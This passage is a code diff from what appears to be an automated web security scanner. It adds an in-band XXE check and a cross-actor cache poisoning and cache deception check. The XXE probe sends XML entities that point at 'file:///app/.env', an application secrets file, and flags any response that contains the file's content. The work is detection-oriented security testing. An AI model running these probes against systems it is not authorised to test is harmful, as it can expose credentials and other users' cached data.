+    const ctrl = await send({ method, pathAndQuery: req.pathAndQuery, body: inbandBody('file:///app/.env'), headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind })
+    const probe = await send({ method, pathAndQuery: req.pathAndQuery, body: inbandBody(entity), headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind })
+    if (!ctrl || !probe) continue
+    const marker = resolvedMarkers.test(probe.body)
+    const diverged = probe.status !== ctrl.status || responseSimilarity(ctrl.body, probe.body) < 0.9
+    inband.push({ entity, controlStatus: ctrl.status, probeStatus: probe.status, marker, diverged })
+    if (marker) {
+      anomalies.push({
+        type: 'xxe_entity_resolved_inband',
+        entity,
+        controlStatus: ctrl.status,
+        acceptedStatus: probe.status,
+        marker: 'resolved-file-content',
+      })
+      inbandHit = true
+      break
+    }
+  }
+
   const hits = new Map<string, ReturnType<CanaryBroker['checkCanary']>>()
   while (!signal.aborted) {
     for (const m of minted) {
@@ -3324,14 +3807,83 @@ async function diffXxeCanary(
   return {
     verdict: anomalies.length > 0 ? 'signal' : 'no_signal',
     summary: anomalies.length > 0
-      ? 'Correlated out-of-band CanaryBroker callback observed from benign XML external entity probe.'
+      ? inbandHit
+        ? 'XML external entity resolved server-local content into the response (in-band proof, no OOB callback).'
+        : 'Correlated out-of-band CanaryBroker callback observed from benign XML external entity probe.'
       : 'No out-of-band XXE callback observed.',
-    details: { results, suggestedReplayKind: 'http_chain' },
+    details: { results, inband, suggestedReplayKind: 'http_chain' },
   }
 }
 
 async function diffCachePoisonDeception(ctx: DiffContext): Promise<DiffOutcome> {
   const { req, runner, send, anomalies, notes } = ctx
+  const crossActor: Array<Record<string, unknown>> = []
+  // Header-less cache inference: warm the entry as one actor, then prove a different actor receives
+  // the warmed body while its own fresh (cache-busted) response differs. This needs no Age/X-Cache.
+  if (req.ownerPersona && req.otherPersona && req.ownerPersona !== req.otherPersona) {
+    const warmPaths: string[] = [req.pathAndQuery]
+    for (const path of warmPaths.slice(0, 1)) {
+      const warmPath = appendCacheBuster(path, randomUUID())
+      const warm = await runner.send({ origin: ctx.origin, method: 'GET', pathAndQuery: warmPath, persona: req.ownerPersona, probeClass: 'cache_poison_deception' })
+      if (!warm.ok || warm.ex.status < 200 || warm.ex.status >= 300) {
+        crossActor.push({ path, skipped: 'warm' })
+        continue
+      }
+      runner.stage(warm.ex)
+      const repeat = await runner.send({ origin: ctx.origin, method: 'GET', pathAndQuery: warmPath, persona: req.otherPersona, probeClass: 'cache_differential', cacheVerify: true })
+      if (!repeat.ok) { crossActor.push({ path, skipped: 'repeat' }); continue }
+      runner.stage(repeat.ex)
+      const freshPath = appendCacheBuster(req.crossControlPath ?? path, randomUUID())
+      const fresh = await runner.send({ origin: ctx.origin, method: 'GET', pathAndQuery: freshPath, persona: req.otherPersona, probeClass: 'cache_differential' })
+      if (!fresh.ok) { crossActor.push({ path, skipped: 'fresh' }); continue }
+      runner.stage(fresh.ex)
+      const simWarmRepeat = responseSimilarity(warm.ex.body, repeat.ex.body)
+      const simFreshRepeat = responseSimilarity(fresh.ex.body, repeat.ex.body)
+      const simWarmFresh = responseSimilarity(warm.ex.body, fresh.ex.body)
+      const ownerCanary = /rb[cs]_[a-z0-9]+_[0-9a-f]{12}/.exec(warm.ex.body)?.[0] ?? null
+      const ownerMarker = req.actorMarkers?.owner
+      const markerInWarm = ownerMarker ? warm.ex.body.includes(ownerMarker) : true
+      const markerInRepeat = ownerMarker ? repeat.ex.body.includes(ownerMarker) : true
+      const canaryRepeated = ownerCanary ? repeat.ex.body.includes(ownerCanary) && !fresh.ex.body.includes(ownerCanary) : false
+      const cacheHitObserved = simWarmRepeat >= 0.9 && simFreshRepeat < 0.95 && simWarmFresh < 0.95 &&
+        markerInWarm && markerInRepeat && canaryRepeated
+      crossActor.push({ path, freshPath: req.crossControlPath ?? null, simWarmRepeat, simFreshRepeat, simWarmFresh, ownerCanary: Boolean(ownerCanary), markerInRepeat, canaryRepeated, hit: cacheHitObserved })
+      notes.push(`cache cross-actor warm/repeat=${simWarmRepeat.toFixed(3)} fresh/repeat=${simFreshRepeat.toFixed(3)} hit=${cacheHitObserved}`)
+      if (cacheHitObserved) {
+        const basePath = path.split('?')[0] + (path.includes('?') ? `?${path.split('?').slice(1).join('?')}` : '')
+        const controlBase = req.crossControlPath ?? basePath
+        anomalies.push({
+          type: 'cache_poisoning',
+          proof: 'body_repeat',
+          path: basePath,
+          controlPath: controlBase,
+          poisonPersona: req.ownerPersona,
+          verifyPersona: req.otherPersona,
+          actorDifferential: true,
+          cacheHit: false,
+          similarity: simWarmRepeat,
+          freshOtherSimilarity: simFreshRepeat,
+          suggestedReplayKind: 'cache_differential',
+        })
+        anomalies.push({
+          type: 'web_cache_deception',
+          mode: 'cross_actor',
+          deceptionUrl: basePath,
+          similarity: simWarmRepeat,
+          freshOtherSimilarity: simFreshRepeat,
+          cacheHitObserved: true,
+          ownerPersona: req.ownerPersona,
+          otherPersona: req.otherPersona,
+          suggestedReplayKind: 'cache_differential',
+        })
+        return {
+          verdict: 'signal',
+          summary: 'A response warmed by one actor was served to a different actor while its fresh response differed (cache hit inferred without headers).',
+          details: { mode: 'cross_actor', simWarmRepeat, simFreshRepeat, simWarmFresh, cacheHitObserved },
+        }
+      }
+    }
+  }
   const ctrlGcb = randomUUID()
   const ctrlPath = appendCacheBuster(req.pathAndQuery, ctrlGcb)
   const ctrlEx = await send({
@@ -3462,7 +4014,7 @@ async function diffCachePoisonDeception(ctx: DiffContext): Promise<DiffOutcome> 
     summary: anomalies.length > 0
       ? 'Cache poisoning or cache deception differential persisted to a clean unauthenticated fetch; build a cache_differential Replay Spec.'
       : 'No cache poisoning or cache deception persistence observed.',
-    details: { variants: variantsOut, suggestedReplayKind: 'cache_differential' },
+    details: { variants: variantsOut, crossActor, suggestedReplayKind: 'cache_differential' },
   }
 }
 
